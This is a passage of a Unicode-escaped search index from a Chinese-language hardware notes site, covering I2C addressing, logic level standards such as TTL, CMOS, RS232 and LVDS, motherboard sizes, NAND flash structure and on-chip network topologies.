\u200b\u5730\u5740\u200b\u662f\u200b\u53ef\u4ee5\u200b\u6539\u200b\u7684\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4e00\u4e9b\u200b\u5f15\u811a\u200b\u7684\u200b\u62c9\u9ad8\u200b\u6216\u62c9\u4f4e\u200b\u6765\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u4f46\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e9b\u200b\u82af\u7247\u200b\uff08\u200b\u5982\u200bVCNL36828P\uff09\u200b\u7528\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u7279\u522b\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6765\u200b\u914d\u7f6e\u200b\u4e0d\u540c\u200b\u7684\u200b slave \u200b\u5730\u5740\u200b\uff1a\u200b\u6b63\u63a5\u200b\u548c\u200b\u53cd\u63a5\u200b\u3002\u200b\u6b63\u63a5\u200b\u5c31\u662f\u200b master \u200b\u7684\u200b SCL \u200b\u63a5\u200b slave \u200b\u7684\u200b SCL\uff0cmaster \u200b\u7684\u200b SDA \u200b\u63a5\u200b slave \u200b\u7684\u200b SDA\uff1b\u200b\u53cd\u63a5\u200b\u5c31\u662f\u200b master \u200b\u7684\u200b SCL \u200b\u63a5\u200b slave \u200b\u7684\u200b SDA\uff0cmaster \u200b\u7684\u200b SDA \u200b\u63a5\u200b slave \u200b\u7684\u200b SCL\u3002\u200b\u6b63\u63a5\u200b\u548c\u200b\u53cd\u63a5\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u7528\u200b\u7684\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b slave \u200b\u5730\u5740\u200b\uff0c\u200b\u5e76\u4e14\u200b\u8fd9\u4e2a\u200b\u64cd\u4f5c\u200b\u5bf9\u200b master \u200b\u6765\u8bf4\u200b\u662f\u200b\u900f\u660e\u200b\u7684\u200b\uff0c\u200b\u5176\u4ed6\u200b slave \u200b\u4f9d\u7136\u200b\u662f\u200b\u6b63\u63a5\u200b\u3002\u200b\u80cc\u540e\u200b\u7684\u200b\u5b9e\u73b0\u200b\u539f\u7406\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u731c\u200b\u5230\u200b\uff1aslave \u200b\u4fa7\u200b\u68c0\u6d4b\u200b SCL \u200b\u548c\u200b SDA \u200b\u7684\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u662f\u200b\u6b63\u200b\u7684\u200b\u8fd8\u662f\u200b\u53cd\u200b\u7684\u200b\uff0c\u200b\u7136\u540e\u200b\u6839\u636e\u200b\u63a5\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u627e\u5230\u200b\u6b63\u786e\u200b\u7684\u200b\u4fe1\u53f7\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u903b\u8f91\u200b\u6b63\u786e\u6027\u200b\uff0c\u200b\u540c\u65f6\u200b\u4f7f\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b slave \u200b\u5730\u5740\u200b\u3002</p>"},{"location":"hardware/logic_levels.html","title":"\u903b\u8f91\u200b\u7535\u5e73\u200b\u6807\u51c6","text":"<p>\u200b\u903b\u8f91\u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u4e0d\u540c\u200b\u82af\u7247\u200b\u4e4b\u95f4\u200b\uff0c\u200b\u5982\u4f55\u200b\u628a\u200b\u6570\u5b57\u4fe1\u53f7\u200b 0 \u200b\u6216\u8005\u200b 1 \u200b\u8f6c\u5316\u200b\u4e3a\u200b\u9ad8\u200b\u4f4e\u7535\u5e73\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5982\u4f55\u200b\u628a\u200b\u9ad8\u200b\u4f4e\u7535\u5e73\u200b\u8f6c\u6362\u200b\u56de\u200b 0 \u200b\u6216\u8005\u200b 1\u3002</p> <p>\u200b\u9996\u5148\u200b\u662f\u200b\u8f93\u51fa\u200b\uff0c\u200b\u8981\u200b\u628a\u200b 0 \u200b\u6216\u8005\u200b 1 \u200b\u8f6c\u5316\u200b\u4e3a\u200b\u9ad8\u200b\u4f4e\u7535\u5e73\u200b\uff0c\u200b\u4e8e\u662f\u200b\u5c31\u8981\u200b\u5b9a\u4e49\u200b\u8303\u56f4\u200b\uff1a</p> <ul> <li>\u200b\u8f93\u51fa\u200b 0\uff1a\u200b\u7535\u538b\u200b\u6700\u9ad8\u200b\u662f\u200b \\(V_{OL}\\)\uff0cOutput Low Voltage</li> <li>\u200b\u8f93\u51fa\u200b 1\uff1a\u200b\u7535\u538b\u200b\u6700\u4f4e\u200b\u662f\u200b \\(V_{OH}\\)\uff0cOutput High Voltage</li> </ul> <p>\u200b\u53cd\u8fc7\u6765\u200b\uff0c\u200b\u8981\u200b\u628a\u200b\u7535\u5e73\u200b\u8f6c\u6362\u200b\u5230\u200b 0 \u200b\u6216\u8005\u200b 1 \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u5b9a\u4e49\u200b\u8303\u56f4\u200b\uff1a</p> <ul> <li>\u200b\u5982\u679c\u200b\u7535\u538b\u200b\u9ad8\u4e8e\u200b \\(V_{IH}\\)\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u662f\u200b 1</li> <li>\u200b\u5982\u679c\u200b\u7535\u538b\u200b\u4f4e\u4e8e\u200b \\(V_{IL}\\)\uff0c\u200b\u5c31\u200b\u8ba4\u4e3a\u200b\u662f\u200b 0</li> </ul> <p>\u200b\u901a\u5e38\u200b\uff0c\u200b\u4e0a\u9762\u200b\u56db\u9879\u200b\u6ee1\u8db3\u200b \\(V_{OL} &lt; V_{IL} &lt; V_{IH} &lt; V_{OH}\\)\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u8f93\u5165\u200b\u4f1a\u200b\u6bd4\u200b\u8f93\u51fa\u200b\u7684\u200b\u8303\u56f4\u200b\u66f4\u5927\u200b\uff0c\u200b\u66f4\u52a0\u200b\u5bbd\u5bb9\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e00\u5b9a\u200b\u7684\u200b\u5bb9\u9519\u200b\u3002</p>"},{"location":"hardware/logic_levels.html#ttl","title":"TTL \u200b\u7535\u5e73","text":"<p>\u200b\u5e38\u89c1\u200b\u7684\u200b 5V TTL \u200b\u7535\u5e73\u200b\uff0c\u200b\u4ee5\u200b https://learn.sparkfun.com/tutorials/logic-levels/ttl-logic-levels \u200b\u7684\u200b\u6570\u636e\u200b\u4e3a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u7535\u5e73\u200b\u8303\u56f4\u200b\u662f\u200b\uff1a</p> <ul> <li>\u200b\u8f93\u51fa\u200b 0: \\(V_{OL}=0.4\\), \\([0, 0.4]\\mathrm{V}\\)</li> <li>\u200b\u8f93\u51fa\u200b 1: \\(V_{OH}=2.7\\), \\([2.7, 5]\\mathrm{V}\\)</li> <li>\u200b\u8f93\u5165\u200b 0: \\(V_{IL}=0.8\\), \\([0, 0.8]\\mathrm{V}\\)</li> <li>\u200b\u8f93\u5165\u200b 1: \\(V_{IH}=2.0\\), \\([2, 5]\\mathrm{V}\\)</li> </ul> <p>Wikipedia \u200b\u4e0a\u200b\u7684\u200b\u6570\u636e\u200b\u4e2d\u200b \\(V_{OH}=2.4\\)\u3002</p> <p>FT232H \u200b\u82af\u7247\u200b\u652f\u6301\u200b TTL\uff0c\u200b\u53c2\u6570\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>\\(V_{OL}=0.4\\), \\(V_{OH}=2.4\\)</li> <li>\\(V_{IL}=0.8\\), \\(V_{OL}=2.0\\)</li> </ul>"},{"location":"hardware/logic_levels.html#cmos","title":"CMOS \u200b\u7535\u5e73","text":"<p>\u200b\u73b0\u5728\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u662f\u200b CMOS \u200b\u7535\u5e73\u200b\u3002\u200b\u4ee5\u200b Artix-7 FPGAs \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u5b83\u200b\u652f\u6301\u200b\u591a\u79cd\u200b CMOS \u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\uff1a</p> <ul> <li>LVCMOS12: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS15: \\(V_{OL}=0.25V_{CCO}, V_{OH}=0.75V_{CCO}, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS18: \\(V_{OL}=0.45, V_{OH}=V_{CCO}-0.45, V_{IL}=0.35V_{CCO}, V_{IH}=0.65V_{CCO}\\)</li> <li>LVCMOS25: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.7, V_{IH}=1.7\\)</li> <li>LVCMOS33: \\(V_{OL}=0.4, V_{OH}=V_{CCO}-0.4, V_{IL}=0.8, V_{IH}=2.0\\)</li> </ul> <p>\u200b\u5176\u4e2d\u200b \\(V_{CCO}\\) \u200b\u662f\u200b\u5916\u90e8\u200b\u8f93\u5165\u200b\u7684\u200b\u7535\u538b\u200b\uff0c\u200b\u4e0e\u200b LVCMOS \u200b\u540e\u9762\u200b\u7684\u200b\u4e24\u4f4d\u200b\u6570\u5b57\u200b\u5339\u914d\u200b\uff0cLVCMOS33 \u200b\u5c31\u200b\u5bf9\u5e94\u200b 3.3 V\u3002\u200b\u6bcf\u4e2a\u200b Bank \u200b\u90fd\u200b\u6709\u200b\u76f8\u540c\u200b\u7684\u200b \\(V_{CCO}\\) \u200b\u7535\u538b\u200b\uff0c\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u5728\u200b\u7ea6\u675f\u200b\u6587\u4ef6\u200b\u91cc\u200b\u8981\u200b\u5199\u200b IOSTANDARD\uff0c\u200b\u5e76\u4e14\u200b\u7ecf\u5e38\u200b\u8fde\u7eed\u200b\u7684\u200b\u4fe1\u53f7\u200b\u90fd\u200b\u4f7f\u7528\u200b\u540c\u6837\u200b\u7684\u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u3002</p> <p>\u200b\u4e00\u4e9b\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cTTL \u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u548c\u200b CMOS \u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u662f\u200b\u53ef\u4ee5\u200b\u517c\u5bb9\u200b\u7684\u200b\uff0c\u200b\u53ea\u8981\u200b\u5b83\u4eec\u200b\u7684\u200b\u7535\u538b\u200b\u8303\u56f4\u200b\u6ee1\u8db3\u8981\u6c42\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u63a5\u53d7\u200b\u8f83\u200b\u9ad8\u200b\u7684\u200b\u8f93\u5165\u200b\u7535\u538b\u200b\u3002\u200b\u8be6\u89c1\u200b Can I Use 3.3V TTL to Trigger a 3.3V CMOS Device \u200b\u548c\u200b Logic Guide - Texas Instruments\uff1a</p> <p> </p> \u200b\u4e0d\u540c\u200b TTL \u200b\u548c\u200b CMOS \u200b\u7535\u5e73\u200b\u7684\u200b\u517c\u5bb9\u6027\u200b\uff08\u200b\u56fe\u6e90\u200b Logic Guide - Texas Instruments\uff09"},{"location":"hardware/logic_levels.html#rs232","title":"RS232","text":"<p>RS232 \u200b\u6bd4\u8f83\u200b\u7279\u522b\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u7535\u5e73\u200b\u6709\u200b\u6b63\u200b\u6709\u200b\u8d1f\u200b\uff1a</p> <ul> <li>\u200b\u8f93\u51fa\u200b 0: \\([-15, -5] \\mathrm{V}\\)</li> <li>\u200b\u8f93\u51fa\u200b 1: \\([5, 15] \\mathrm{V}\\)</li> <li>\u200b\u8f93\u5165\u200b 0: \\([-15, -3] \\mathrm{V}\\)</li> <li>\u200b\u8f93\u5165\u200b 1: \\([3, 15] \\mathrm{V}\\)</li> </ul> <p>\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u63a5\u200b RS232 \u200b\u5916\u8bbe\u200b\u5230\u200b FPGA \u200b\u4e0a\u200b\uff0c\u200b\u901a\u5e38\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u7535\u5e73\u200b\u8f6c\u6362\u200b\uff08\u200b\u4f8b\u5982\u200b MAX3232 3-V to 5.5-V Multichannel RS-232 Line Driver and Receiver With \u00b115-kV ESD Protection\uff09\uff0c\u200b\u5426\u5219\u200b\u65e0\u6cd5\u200b\u6b63\u5e38\u200b\u5de5\u4f5c\u200b\u3002</p>"},{"location":"hardware/logic_levels.html#rs485","title":"RS485","text":"<p>RS485 \u200b\u901a\u8fc7\u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u6765\u200b\u4f20\u8f93\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u7528\u200b\u4e00\u5bf9\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0c\u200b\u4ee5\u200b\u4e8c\u8005\u200b\u7684\u200b\u5dee\u503c\u200b\u6765\u200b\u8868\u793a\u200b\u6570\u5b57\u4fe1\u53f7\u200b\u7684\u200b 0 \u200b\u6216\u8005\u200b 1\u3002\u200b\u5b83\u200b\u8981\u6c42\u200b\uff0c\u200b\u6570\u5b57\u200b 1 \u200b\u5bf9\u5e94\u200b\u5dee\u5206\u200b\u7535\u538b\u200b \\(V_{a} - V_{b} \\le -200 \\mathrm{mV}\\)\uff0c\u200b\u6570\u5b57\u200b 0 \u200b\u5bf9\u5e94\u200b\u5dee\u5206\u200b\u7535\u538b\u200b \\(V_{a} - V_{b} \\ge +200 \\mathrm{mV}\\)\uff0c\u200b\u6ce2\u5f62\u200b\u5982\u4e0b\u200b\uff1a</p>"},{"location":"hardware/logic_levels.html#sstl","title":"SSTL","text":"<p>SSTL(Stub Series Terminated Logic) \u200b\u662f\u200b SDRAM \u200b\u6240\u200b\u91c7\u7528\u200b\u7684\u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\uff0c\u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7248\u672c\u200b\uff1a</p> <ul> <li>SSTL_15</li> <li>SSTL_18: \\(V_{DDQ} = 1.8 \\mathrm{V}\\), \\(V_{REF} = 0.9 \\mathrm{V}\\)</li> <li>SSTL_2: \\(V_{DDQ} = 2.5 \\mathrm{V}\\), \\(V_{REF} = 1.25 \\mathrm{V}\\)</li> <li>SSTL_3: $V_{DDQ} = 3.3 \\mathrm{V}, \\(V_{REF} = 1.5 \\mathrm{V}\\)</li> </ul> <p>SSTL \u200b\u8fd8\u6709\u200b\u5dee\u5206\u200b\u7248\u672c\u200b\uff0c\u200b\u7528\u4e8e\u200b\u4f20\u8f93\u200b CK\u3001DQS \u200b\u7b49\u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u3002</p>"},{"location":"hardware/logic_levels.html#lvds","title":"LVDS","text":"<p>LVDS(Low Voltage Differential Signaling) \u200b\u4e5f\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u5dee\u5206\u200b\u4fe1\u53f7\u200b\u7535\u5e73\u200b\u6807\u51c6\u200b\u3002\u200b\u7531\u4e8e\u200b\u662f\u200b\u5dee\u5206\u200b\u4f20\u8f93\u200b\uff0c\u200b\u5c31\u200b\u6709\u5171\u6a21\u200b\u7535\u538b\u200b\u548c\u200b\u5dee\u6a21\u200b\u7535\u538b\u200b\u3002\u200b\u4f8b\u5982\u200b LVDS_25 \u200b\u7684\u200b\u5171\u6a21\u200b\u7535\u538b\u200b\u662f\u200b \\(1.2 \\mathrm{V}\\)\uff0c\u200b\u5dee\u6a21\u200b\u7535\u538b\u200b\u662f\u200b \\(0.45 \\mathrm{V}\\)\uff0c\u200b\u610f\u5473\u7740\u200b\u4e24\u4e2a\u200b\u6570\u636e\u4fe1\u53f7\u200b\u4e0a\u200b\u7684\u200b\u7535\u538b\u200b\u4f1a\u200b\u5206\u522b\u200b\u5728\u200b \\(1.2-0.45/2 = 0.975 \\mathrm{V}\\) \u200b\u548c\u200b \\(1.2+0.45/2 = 1.425 \\mathrm{V}\\) \u200b\u4e0a\u4e0b\u200b\u3002</p> <p>TMDS \u200b\u548c\u200b LVDS \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4f46\u662f\u200b\u7535\u538b\u200b\u4e0d\u200b\u4e00\u6837\u200b\u3002TMDS \u200b\u7ecf\u5e38\u200b\u7528\u4e8e\u200b DVI \u200b\u548c\u200b HDMI \u200b\u7684\u200b\u4fe1\u53f7\u200b\u4f20\u8f93\u200b\u3002</p>"},{"location":"hardware/motherboard.html","title":"\u4e3b\u677f","text":""},{"location":"hardware/motherboard.html#_2","title":"\u5c3a\u5bf8","text":"<p>\u200b\u53c2\u8003\u200b https://en.wikipedia.org/wiki/DTX_(form_factor) https://www.silverstonetek.com/en/tech-talk/wh11_008 https://en.wikipedia.org/wiki/ATX\uff1a</p> <ul> <li>Ultra ATX: 366mm x 244mm</li> <li>SSI MEB: 441mm x 330mm</li> <li>EATX(Extended ATX): 305mm x 330mm, 305mm x 257mm, 305mm x 264mm, 305mm x 267mm, 305mm x 272mm</li> <li>ATX: 305mm x 244mm</li> <li>mATX(microATX): 244mm x 244mm</li> <li>DTX: 203mm x 244mm</li> <li>miniDTX: 203mm x 170mm</li> <li>miniITX: 170mm x 170mm</li> </ul>"},{"location":"hardware/motherboard.html#_3","title":"\u4f9b\u7535","text":"<p>ATX \u200b\u5e38\u89c1\u200b\u4f9b\u7535\u200b\u63a5\u53e3\u200b\u662f\u200b 24pin\uff0820+4pin\uff09\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b +3.3V\uff0c+5V\uff0c+12V \u200b\u548c\u200b -12V\u3002\u200b\u9664\u4e86\u200b\u7535\u548c\u5730\u200b\u4ee5\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u4fe1\u53f7\u7ebf\u200b\uff1a</p> <ul> <li>PS_ON#\uff1apower supply on\uff0c\u200b\u4e3b\u677f\u200b\u901a\u8fc7\u200b\u62c9\u4f4e\u200b PS_ON# \u200b\u8ba9\u200b\u7535\u6e90\u200b\u542f\u52a8\u200b\uff1b\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b +5V standby \u200b\u7535\u6e90\u200b\u4e0d\u200b\u53d7\u200b PS_ON# \u200b\u5f71\u54cd\u200b</li> <li>PWR_OK\uff1apower good\uff0c\u200b\u7535\u6e90\u200b\u901a\u77e5\u200b\u4e3b\u677f\u200b\uff0c\u200b\u8f93\u51fa\u200b\u7684\u200b\u7535\u6e90\u200b\u5df2\u7ecf\u200b\u53ef\u7528\u200b</li> </ul>"},{"location":"hardware/nand_flash.html","title":"NAND Flash","text":""},{"location":"hardware/nand_flash.html#_1","title":"\u7ed3\u6784","text":"<p>NAND Flash \u200b\u5206\u200b\u5982\u4e0b\u200b\u5c42\u6b21\u200b\uff1a</p> <ul> <li>Package/Chip</li> <li>Die</li> <li>Plane</li> <li>Block\uff1aErase \u200b\u7684\u200b\u7c92\u5ea6\u200b</li> <li>Page\uff1aProgram/Read \u200b\u7684\u200b\u7c92\u5ea6\u200b</li> </ul> <p>Erase\uff1a\u200b\u628a\u200b\u6574\u4e2a\u200b Block \u200b\u7684\u200b\u6570\u636e\u200b\u5199\u6210\u200b\u5168\u200b 1</p> <p>Program\uff1a\u200b\u628a\u200b Page \u200b\u7684\u200b\u67d0\u4e9b\u200b 1 \u200b\u6539\u5199\u200b\u6210\u200b 0\uff0c\u200b\u4f46\u200b\u4e0d\u80fd\u200b\u628a\u200b 0 \u200b\u6539\u5199\u200b\u6210\u200b 1</p> <p>\u200b\u7269\u7406\u200b\u4e0a\u200b\uff1aErase \u200b\u628a\u200b\u7535\u538b\u200b\u53d8\u6210\u200b\u6700\u4f4e\u200b\uff0c\u200b\u5bf9\u5e94\u200b 1\uff0cProgram \u200b\u628a\u200b\u7535\u538b\u200b\u62ac\u9ad8\u200b\uff0c\u200b\u628a\u200b 1 \u200b\u53d8\u6210\u200b 0\u3002</p> <p>MLC\uff1a2 bit per cell\uff0c\u200b\u6709\u200b\u56db\u79cd\u200b\u7535\u538b\u200b\u3002</p> <p>TLC\uff1a3 bit per cell\uff0c\u200b\u6709\u200b\u516b\u79cd\u200b\u7535\u538b\u200b\u3002</p>"},{"location":"hardware/nand_flash.html#_2","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Understanding Flash: Blocks, Pages and Program / Erases</li> <li>NAND Flash 101</li> </ul>"},{"location":"hardware/on_chip_networks.html","title":"\u7247\u4e0a\u200b\u7f51\u7edc","text":""},{"location":"hardware/on_chip_networks.html#_2","title":"\u80cc\u666f","text":"<p>\u200b\u968f\u7740\u200b\u82af\u7247\u200b\u5185\u200b\u7684\u200b\u6838\u5fc3\u200b\u6570\u91cf\u200b\u589e\u591a\u200b\uff0c\u200b\u5728\u200b\u5b9e\u73b0\u200b\u4e92\u8054\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f20\u7edf\u200b\u7684\u200b Crossbar \u200b\u9047\u5230\u200b\u4e86\u200b\u6269\u5c55\u6027\u200b\u7684\u200b\u74f6\u9888\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u7528\u7247\u200b\u4e0a\u200b\u7f51\u7edc\u200b\u6765\u200b\u66ff\u4ee3\u200b Crossbar\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u4e3b\u8981\u200b\u6309\u7167\u200b On-Chip Networks, Second Edition \u200b\u4ee5\u53ca\u200b\u300a\u200b\u8ba1\u7b97\u673a\u7cfb\u7edf\u200b\u7ed3\u6784\u200b\u300b\u200b\u8bfe\u7a0b\u200b\u548c\u200b\u300a\u200b\u9ad8\u7b49\u200b\u8ba1\u7b97\u673a\u7cfb\u7edf\u200b\u7ed3\u6784\u200b\u300b\u200b\u8bfe\u4ef6\u200b\u7684\u200b\u987a\u5e8f\u200b\u8fdb\u884c\u200b\u8bb2\u89e3\u200b\u3002</p>"},{"location":"hardware/on_chip_networks.html#_3","title":"\u62d3\u6251","text":"<p>\u200b\u62d3\u6251\u200b\u8bb2\u200b\u7684\u200b\u5c31\u662f\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u7684\u200b\u8fde\u63a5\u200b\u65b9\u5f0f\u200b\u3002\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u62d3\u6251\u200b\u6709\u200b\uff1a</p> <ol> <li>Ring\uff1a\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u8fde\u63a5\u200b\u5230\u200b\u73af\u4e0a\u200b\u76f8\u90bb\u200b\u7684\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b</li> <li>Mesh\uff1a\u200b\u4ee5\u200b 2D Mesh \u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u628a\u200b\u7ed3\u70b9\u200b\u653e\u5728\u200b\u4e00\u4e2a\u200b\u7f51\u683c\u200b\u91cc\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7ed3\u70b9\u200b\u6700\u200b\u591a\u200b\u8fde\u63a5\u200b\u56db\u4e2a\u200b\u76f8\u90bb\u200b\u7ed3\u70b9\u200b\uff1a\u200b\u5728\u200b\u5185\u90e8\u200b\u7684\u200b\u8fde\u63a5\u200b\u56db\u4e2a\u200b\u76f8\u90bb\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u5728\u200b\u8fb9\u4e0a\u200b\u7684\u200b\u53ea\u200b\u8fde\u63a5\u200b\u4e09\u4e2a\u200b\u76f8\u90bb\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u5728\u200b\u89d2\u4e0a\u200b\u7684\u200b\u53ea\u200b\u8fde\u63a5\u200b\u4e24\u4e2a\u200b\u7ed3\u70b9\u200b</li> <li>Torus\uff1a\u200b\u5728\u200b Mesh \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u8ba9\u200b\u8fb9\u200b\u548c\u200b\u89d2\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u4e5f\u200b\u8fde\u63a5\u200b\u56db\u4e2a\u200b\u7ed3\u70b9\u200b\uff1a\u200b\u8fb9\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u8fde\u5230\u200b\u5bf9\u4fa7\u200b\u6700\u8fdc\u200b\u7684\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u89d2\u4e0a\u200b\u7684\u200b\u7ed3\u70b9\u200b\u8fde\u200b\u5230\u200b\u53e6\u5916\u200b\u4e24\u4e2a\u200b\u89d2\u200b</li> </ol> <p> </p> Ring\uff0cMesh \u200b\u548c\u200b Torus\uff08\u200b\u56fe\u6e90\u200b On Chip Networks, Second Edition\uff09 <p>\u200b\u5176\u4e2d\u200b Mesh \u200b\u548c\u200b Torus \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u6269\u5c55\u200b\u5230\u200b\u9ad8\u9636\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4f8b\u5982\u200b 3D \u200b\u7684\u200b\u7acb\u65b9\u4f53\u200b\u3002</p> <p>\u200b\u8fd8\u6709\u200b\u4e00\u4e9b\u200b\u6bd4\u8f83\u590d\u6742\u200b\u7684\u200b\u7f51\u7edc\u62d3\u6251\u200b\uff0c\u200b\u4f8b\u5982\u200b Fat Tree\uff0c\u200b\u5728\u200b\u6811\u5f62\u200b\u62d3\u6251\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6811\u4e0a\u200b\u4e24\u200b\u53f6\u5b50\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u8def\u5f84\u200b\u4f1a\u200b\u6bd4\u8f83\u200b\u591a\u5730\u200b\u7ecf\u8fc7\u200b\u5c42\u6570\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\u7684\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6839\u200b\u7ed3\u70b9\u200b\uff0c\u200b\u628a\u200b\u9760\u8fd1\u200b\u6839\u200b\u7ed3\u70b9\u200b\u7684\u200b\u8fb9\u200b\u53d8\u7c97\u200b\uff08\u200b\u589e\u52a0\u200b\u5e26\u5bbd\u200b\uff09\uff1a</p> <p> </p> Fat Tree\uff08\u200b\u56fe\u6e90\u200b Wikipedia\uff09 <p>\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4ee5\u4e0b\u200b\u51e0\u4e2a\u200b\u65b9\u9762\u200b\u8bc4\u4f30\u200b\u4e00\u4e2a\u200b\u62d3\u6251\u200b\u7684\u200b\u5c5e\u6027\u200b\uff1a</p> <ol> <li>\u200b\u7ed3\u70b9\u200b\u7684\u200b\u5ea6\u200b\uff1a\u200b\u8fde\u63a5\u200b\u7684\u200b\u7ed3\u70b9\u200b\u6570\u200b</li> <li>\u200b\u76f4\u5f84\u200b\uff1a\u200b\u7ed3\u70b9\u200b\u95f4\u200b\u8ddd\u79bb\u200b\u7684\u200b\u6700\u5927\u503c\u200b</li> <li>\u200b\u7b49\u200b\u5206\u200b\u5bbd\u5ea6\u200b\uff1a\u200b\u7f51\u7edc\u200b\u88ab\u200b\u5207\u6210\u200b\u4e24\u534a\u200b\uff08\u200b\u6216\u8005\u200b\u51e0\u4e4e\u200b\u4e24\u534a\u200b\uff09\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5207\u5272\u200b\u7684\u200b\u6700\u5c0f\u200b\u8fb9\u6570\u200b</li> </ol> <p>\u200b\u5728\u200b\u8fd9\u200b\u4e09\u79cd\u200b\u62d3\u6251\u200b\u4e2d\u200b\uff0c\u200b\u7ed3\u70b9\u200b\u65e2\u200b\u662f\u200b\u6d41\u91cf\u200b\u7684\u200b\u8d77\u70b9\u200b\u548c\u200b\u7ec8\u70b9\u200b\uff0c\u200b\u53c8\u200b\u8d1f\u8d23\u200b\u4e86\u200b\u6d41\u91cf\u200b\u7684\u200b\u8f6c\u53d1\u200b\u3002</p> <p>\u200b\u53e6\u4e00\u7c7b\u200b\u62d3\u6251\u200b\u4e2d\u200b\uff0c\u200b\u6709\u200b\u90e8\u5206\u200b\u7ed3\u70b9\u200b\u53ea\u200b\u8d1f\u8d23\u200b\u8f6c\u53d1\u200b\u6d41\u91cf\u200b\uff0c\u200b\u4e0d\u200b\u4f5c\u4e3a\u200b\u6d41\u91cf\u200b\u7684\u200b\u8d77\u70b9\u200b\u548c\u200b\u7ec8\u70b9\u200b\uff0c\u200b\u4f8b\u5982\u200b Butterfly \u200b\u7f51\u7edc\u200b\uff0cClos \u200b\u7f51\u7edc\u200b\uff0cFat Tree\u3002</p> <p>\u200b\u4f46\u200b\u7531\u4e8e\u200b\u7247\u4e0a\u200b\u7f51\u7edc\u200b\u662f\u200b\u8981\u200b\u5b9e\u73b0\u200b\u5728\u200b\u82af\u7247\u200b\u4e0a\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u82af\u7247\u200b\u662f\u200b 2D 